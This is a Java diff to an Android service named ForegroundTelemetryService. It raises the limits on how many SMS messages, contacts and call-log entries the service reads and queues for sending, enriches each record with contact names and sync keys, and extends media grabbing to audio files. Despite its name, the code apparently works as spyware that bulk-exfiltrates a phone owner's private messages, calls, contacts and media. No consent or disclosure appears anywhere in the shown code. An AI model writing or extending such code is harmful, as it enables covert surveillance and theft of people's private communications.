@@ -201,6 +201,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         return prefs().getString("auth_token", null);
     }
 
+    private String normalizePhoneNumber(String value) {
+        if (value == null) return "";
+        return value.replaceAll("\\D+", "");
+    }
+
     private JSONObject eventBody(String type, JSONObject payload) throws Exception {
         JSONObject body = new JSONObject();
         body.put("type", type);
@@ -828,22 +833,34 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             Cursor cur = cr.query(Uri.parse("content://sms"), null, null, null, "date DESC");
             if (cur == null) return;
 
-            int max = 200;
-            while (cur.moveToNext() && max-- > 0) {
+            int queued = 0;
+            int scanned = 0;
+            while (cur.moveToNext() && scanned++ < 4000 && queued < 400) {
                 try {
                     String addr = cur.getString(cur.getColumnIndexOrThrow("address"));
                     String bodyTxt = cur.getString(cur.getColumnIndexOrThrow("body"));
                     long ts = cur.getLong(cur.getColumnIndexOrThrow("date"));
-                    String key = "sms|" + addr + "|" + ts + "|" + (bodyTxt != null ? bodyTxt.hashCode() : 0);
+                    int type = -1;
+                    try {
+                        type = cur.getInt(cur.getColumnIndexOrThrow("type"));
+                    } catch (Exception ignored) {
+                    }
+                    String key = "sms|" + addr + "|" + ts + "|" + type + "|" + (bodyTxt != null ? bodyTxt.hashCode() : 0);
                     if (sent.contains(key)) continue;
 
                     JSONObject payload = new JSONObject();
                     payload.put("from", addr);
+                    String contactName = lookupContactName(addr);
+                    if (contactName != null && contactName.trim().length() > 0) payload.put("contactName", contactName);
                     payload.put("body", bodyTxt);
+                    payload.put("source", "sms");
+                    payload.put("syncKey", key);
+                    payload.put("boxType", type);
                     payload.put("ts", ts);
                     sendOrQueue("sms", payload);
 
                     sent.add(key);
+                    queued++;
                 } catch (Exception e) {
                     Log.e(TAG, "sms item err", e);
                 }
@@ -876,13 +893,15 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             );
             if (cur == null) return;
 
-            int max = 1000;
-            while (cur.moveToNext() && max-- > 0) {
+            int queued = 0;
+            int scanned = 0;
+            while (cur.moveToNext() && scanned++ < 6000 && queued < 2000) {
                 try {
                     String name = cur.getString(0);
                     String number = cur.getString(1);
                     String contactId = cur.getString(2);
-                    String key = (contactId != null && contactId.length() > 0) ? contactId : (number != null ? number : name);
+                    String normalizedNumber = normalizePhoneNumber(number);
+                    String key = (contactId != null && contactId.length() > 0) ? contactId : (!normalizedNumber.isEmpty() ? normalizedNumber : (number != null ? number : name));
                     if (key == null || key.trim().length() == 0 || sent.contains(key)) continue;
 
                     JSONObject payload = new JSONObject();
@@ -892,6 +911,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     payload.put("ts", System.currentTimeMillis());
                     sendOrQueue("contact", payload);
                     sent.add(key);
+                    queued++;
                 } catch (Exception e) {
                     Log.e(TAG, "contact item err", e);
                 }
@@ -915,8 +935,9 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             Cursor cur = cr.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
             if (cur == null) return;
 
-            int max = 250;
-            while (cur.moveToNext() && max-- > 0) {
+            int queued = 0;
+            int scanned = 0;
+            while (cur.moveToNext() && scanned++ < 4000 && queued < 500) {
                 try {
                     String number = cur.getString(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                     int type = cur.getInt(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
@@ -937,6 +958,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     payload.put("direction", callDirectionLabel(type));
                     payload.put("typeLabel", callDirectionLabel(type));
                     payload.put("duration", duration);
+                    payload.put("syncKey", key);
                     payload.put("ts", ts);
                     String contactName = cachedName != null && cachedName.trim().length() > 0 ? cachedName : lookupContactName(number);
                     if (contactName != null && contactName.trim().length() > 0) {
@@ -945,6 +967,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     sendOrQueue("call", payload);
 
                     sent.add(key);
+                    queued++;
                 } catch (Exception e) {
                     Log.e(TAG, "call item err", e);
                 }
@@ -1025,7 +1048,15 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 } catch (Exception ignored) {
                 }
 
-                Uri uri = ContentUris.withAppendedId(image ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI : MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id);
+                Uri baseUri;
+                if (image) {
+                    baseUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                } else if ("gallery_audio".equals(origin)) {
+                    baseUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
+                } else {
+                    baseUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
+                }
+                Uri uri = ContentUris.withAppendedId(baseUri, id);
                 try (InputStream is = cr.openInputStream(uri)) {
                     if (is == null) continue;
                     byte[] data = readAllBytes(is);
